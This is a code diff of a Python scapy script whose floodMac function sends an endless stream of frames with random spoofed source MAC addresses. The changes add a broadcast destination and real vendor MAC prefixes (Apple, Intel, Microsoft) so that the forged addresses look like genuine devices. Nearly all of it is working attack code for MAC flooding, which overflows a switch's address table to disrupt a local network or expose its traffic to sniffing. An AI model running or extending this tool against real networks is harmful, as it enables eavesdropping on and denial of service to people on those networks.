@@ -7,6 +7,12 @@ import os
 import time
 from scapy.all import *
 
+DestMAC = "FF:FF:FF:FF:FF:FF" # broadcast MAC address
+
+MACprefix = 'b8:e8:56' # Apple inc prefix
+#MACprefix = '00:1B:21' # Intel Corporate prefix
+#MACprefix = '00:15:5D' # Microsoft prefix
+
 packetCount = 0
 stop_event = threading.Event()
 
@@ -15,7 +21,7 @@ def check_root():
         print("Script must run as root")
         sys.exit(1)
 
-def generateRandomMac():
+def generateRandomMacFull():
     mac = ""
     for i in range(6):
         digit = hex(random.randint(0, 255))[2:]
@@ -23,6 +29,15 @@ def generateRandomMac():
             digit = "0" + digit
         mac += digit + ":"
     return mac[:-1]
+
+def generateRandomMac():
+    mac = MACprefix  # Начинаем с префикса
+    for i in range(3):  # Генерируем оставшиеся 3 байта
+        digit = hex(random.randint(0, 255))[2:]
+        if len(digit) == 1:
+            digit = "0" + digit
+        mac += ":" + digit
+    return mac
 
 def sendPacket(sourceMac, destinationMac):
     global packetCount
@@ -35,7 +50,7 @@ def sendPacket(sourceMac, destinationMac):
 def floodMac():
     while not stop_event.is_set():
         try:
-            sendPacket(generateRandomMac(), generateRandomMac())
+            sendPacket(generateRandomMac(), DestMAC)
         except Exception as e:
             print(f"An error occurred: {e}")
 
